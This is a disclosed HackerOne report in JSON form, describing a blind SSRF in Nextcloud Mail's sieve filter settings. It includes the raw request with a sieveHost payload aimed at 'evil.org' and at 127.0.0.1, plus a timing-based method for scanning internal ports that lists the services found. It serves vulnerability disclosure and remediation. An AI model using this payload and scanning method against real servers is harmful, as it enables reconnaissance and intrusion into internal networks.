{
  "id": 1741525,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzQxNTI1",
  "url": "https://hackerone.com/reports/1741525",
  "title": "Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-10-18T19:24:46.638Z",
  "submitted_at": "2022-10-18T19:24:46.738Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "supr4s",
    "url": "/supr4s",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/cnms4l7faunf0sht0ox61ouwsqlj/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-23943"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-02-06T21:27:57.263Z",
  "bug_reporter_agreed_on_going_public_at": "2023-02-06T21:27:57.182Z",
  "team_member_agreed_on_going_public_at": "2023-02-06T09:48:12.140Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi everyone,\nI would like to report another  Blind SSRF vulnerability through the Nextcloud Mail application.\n\nTested on latest Mail release : `2.0.1`\n\n## Steps To Reproduce:\n\nFirstly, this report is similar to #1736390 except that it touches a new parameter and a different endpoint.\n\nWhen adding a filter via a sieve filter server (`mail` application => added mailbox => settings => Sieve filter server), the following request is made : \n\n```\nPUT /apps/mail/api/sieve/account/5 HTTP/2\nHost: redacted\nCookie: redactedr\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0\nAccept: application/json, text/plain, */*\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/json\nRequesttoken: redacted\nContent-Length: 117\nOrigin: redacted\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\n{\"sieveEnabled\":true,\"sieveHost\":\"evil.org\",\"sievePort\":\"80\",\"sieveUser\":\"\",\"sievePassword\":\"\",\"sieveSslMode\":\"none\"}\n```\n\nThe SSRF is found in the `sieveHost` parameter, and provided that the `sieveSslMode` parameter is set to `none`.\n\n```\n{\"sieveEnabled\":true,\"sieveHost\":\"127.0.0.1\",\"sievePort\":\"80\",\"sieveUser\":\"\",\"sievePassword\":\"\",\"sieveSslMode\":\"none\"}\n```\n\nVia the Burp Intruder tool, I will guess the open ports on my Nextcloud server. Response time less than 100ms => closed port. Response time higher than 5000ms = open ports and service listening on them.\n\n{F1992720}\n\nResult from Burp Intruder on my NC server : \n\n{F1992724}\n\n```\nPort 80 - Apache2 service\nPort 443 - Apache2 service\nPort 2222 - SSH ! (critical)\nPort 6060 - CrowdSec\nPort 8080 - CrowdSec\nPort 3306 - MySQL\nPort 5432 -  PostgreSQL\nPort 6379 - My Redis instance for Nextcloud\n```\n\n## Impact\n\nFrom [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/):\n\n> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).\n\nThis vulnerability can allow a malicious individual to map the server and the company's internal network via Nextcloud. This is not demonstrated here in the report but one can scan private subnet ranges to try to guess : \n\n- Which IP addresses are responding\n- Wich ports are open \n- Tried to exploit vulnerable services through this Blind SSRF\n\nHere are some examples of Blind SSRF, which were used as a rebound, to exploit more critical vulnerabilities :\n\n[Here](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html) is an example of how to use an SSRF blind, as a rebound, to exploit a critical flaw.\n\nLooking forward to exchanging.\n\nRegards,\nSupr4s",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1992720,
      "file_name": "Capture_d__cran_du_2022-10-18_21-09-37.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/88d4bbhrg6uiije7a1qbwkpjy8cg?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-18_21-09-37.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-18_21-09-37.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143149Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ade5f89c4a6ab12b3a29221d1a743b1e245c7397f2a22549d30f0d4eb39dc384",
      "file_size": 152138,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1992724,
      "file_name": "Capture_d__cran_du_2022-10-18_21-11-28.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3pq515gvr391d7aua9pmzmh99bgt?response-content-disposition=attachment%3B%20filename%3D%22Capture_d__cran_du_2022-10-18_21-11-28.png%22%3B%20filename%2A%3DUTF-8%27%27Capture_d__cran_du_2022-10-18_21-11-28.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143149Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6af7ed4ab682d4637a08a6d1e49544f69b879ad4e89aef8e980b43c1a27acbbc",
      "file_size": 48814,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-03-08T09:48:12.245Z",
  "allow_singular_disclosure_after": -29565817.51858323,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "shreyaschavhan",
    "zy9ard3",
    "shubham_srt",
    "shivammusic",
    "unknown1122w",
    "diaaa",
    "sandip05"
  ],
  "severity": {
    "rating": "low",
    "score": 3.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 45132,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "nextcloud/mail",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 248859,
      "category": "team",
      "content": "Security advisory at https://github.com/nextcloud/security-advisories/security/advisories/GHSA-8gcx-r739-9pf6",
      "user": {
        "id": 89223,
        "username": "nickvergessen",
        "name": "Joas Schilling",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "Germany",
        "created_at": "2016-07-01T08:17:59.061Z",
        "url": "https://hackerone.com/nickvergessen",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
